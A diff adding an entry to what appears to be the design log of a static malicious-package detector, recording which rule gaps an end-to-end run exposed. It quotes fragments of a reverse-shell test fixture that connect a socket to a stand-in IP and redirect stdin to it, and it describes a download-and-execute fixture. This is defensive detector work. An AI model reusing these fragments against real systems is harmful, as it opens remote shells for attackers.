@@ -855,6 +855,40 @@ was applied meanwhile.
   caller canonicalises callee text before folding, or `fold_literal` takes the file's alias
   table. A test with `import base64 as b` pins it.
 
+- **2026-09-24, T-12 (first end-to-end run) — what the fixtures showed the method misses.**
+  Found by running the end-to-end rule contracts against the finished CLI. None of these is a
+  CLI defect, and none is to be closed by adjusting a number until the question under it is
+  answered.
+
+  1. **A control-only finding reaches Malicious on its own.** `benign/setup_py_download_data`
+     fetches a data file during install and does nothing dangerous with it. PHX-INS-001 scores
+     High × install × resolved = 0.80, which is exactly the Malicious threshold, and the
+     fixture's contract says an accepted false-positive class must stay below Malicious. The
+     content of a download cannot be known statically; what *is* known is whether the fetched
+     bytes reach a sink, which is the data rules' job (DRP-001/002). So the open question is
+     what an install-time egress with no data path to a dangerous sink is evidence *of*, and
+     how much it should weigh against the same egress with such a path. Changing `>=` to `>`
+     or moving the threshold would hide the question rather than answer it. ADR-010's
+     constants are affected either way.
+  2. **Taint does not pass from a write to the file it lands in.** In `malicious/download_and_run`
+     the response is written through a handle opened on `target`, and `target` is then
+     executed. The data-flow graph has no edge from "bytes written to a handle" to "the path the
+     handle was opened on", so PHX-DRP-002 does not fire.
+  3. **A method argument does not taint its receiver.** In `malicious/reverse_shell`,
+     `s.connect(("203.0.113.9", 4444))` taints the argument, not the socket `s`, so
+     `os.dup2(s.fileno(), 0)` has a clean input and PHX-BKD-001 does not fire. Points 2 and 3
+     are one question about stateful objects (handles, sockets) and probably one ADR-006
+     amendment; over-tainting the receiver of every method call is the obvious fix and the
+     obvious source of false positives.
+  4. **PHX-PER-001** — see the T-11 request, item 2.
+  5. **The rule format cannot select shapes within a source kind.** PHX-DRP-003 fired on the
+     home-directory literal `~` reaching `subprocess`, because it names the whole
+     `SuspiciousLiteral` kind; `subprocess.run(["du", os.path.expanduser("~")])` would fire it
+     too.
+
+  The end-to-end contracts for these stay red until each is decided; `e2e_safety` additionally
+  waits for the fetcher's `PackageRef::parse`.
+
 - **2026-09-24, T-11 (rule engine) — what the catalogue cannot yet express.**
 
   1. **PHX-INS-003's target is a read, not a sink.** RULES.md defines it as a definition
